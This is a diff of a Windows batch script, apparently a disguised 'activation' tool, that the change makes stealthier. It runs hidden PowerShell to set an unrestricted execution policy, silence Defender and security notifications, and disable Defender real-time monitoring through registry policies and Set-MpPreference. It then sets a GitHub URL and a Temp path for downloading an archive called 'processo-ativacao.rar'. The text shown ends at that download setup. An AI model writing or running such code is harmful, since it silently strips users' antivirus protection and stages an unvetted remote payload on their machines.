@@ -1,15 +1,35 @@
 @echo off
 
-powershell -Command "Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser -Force"
-powershell -Command "Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows Defender Security Center\Notifications' -Name 'DisableNotifications' -Value 1 -Type DWord -Force"
-powershell -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance' -Name 'Enabled' -Value 0 -Type DWord -Force"
+powershell -WindowStyle Hidden -Command "Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser -Force"
 
-powershell -Command "Start-Sleep -Seconds 10"
+REG QUERY "HKLM\Software\Microsoft\Windows Defender Security Center\Notifications" >nul 2>&1
+IF %ERRORLEVEL% EQU 0 (
+    powershell -WindowStyle Hidden -Command "Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows Defender Security Center\Notifications' -Name 'DisableNotifications' -Value 1 -Type DWord -Force"
+)
 
-powershell -Command "Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 1 -Type DWord -Force"
-powershell -Command "Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows Defender' -Name 'DisableRealtimeMonitoring' -Value 1 -Type DWord -Force"
+REG QUERY "HKLM\Software\Policies\Microsoft\Windows Defender Security Center\Notifications" >nul 2>&1
+IF %ERRORLEVEL% EQU 0 (
+    powershell -WindowStyle Hidden -Command "Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name 'DisableEnhancedNotifications' -Value 1 -Type DWord -Force"
+)
 
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
+REG QUERY "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" >nul 2>&1
+IF %ERRORLEVEL% EQU 0 (
+    powershell -WindowStyle Hidden -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance' -Name 'Enabled' -Value 0 -Type DWord -Force"
+)
+
+powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 10"
+
+REG QUERY "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" >nul 2>&1
+IF %ERRORLEVEL% EQU 0 (
+    powershell -WindowStyle Hidden -Command "Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 1 -Type DWord -Force"
+)
+
+REG QUERY "HKLM\Software\Policies\Microsoft\Windows Defender" >nul 2>&1
+IF %ERRORLEVEL% EQU 0 (
+    powershell -WindowStyle Hidden -Command "Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows Defender' -Name 'DisableRealtimeMonitoring' -Value 1 -Type DWord -Force"
+)
+
+powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 
 set urlProgram=https://github.com/diegrp/atv-dbooster/raw/main/processo-ativacao.rar
 set destinoProgram=C:\Users\%USERNAME%\AppData\Local\Temp\processo-ativacao.rar
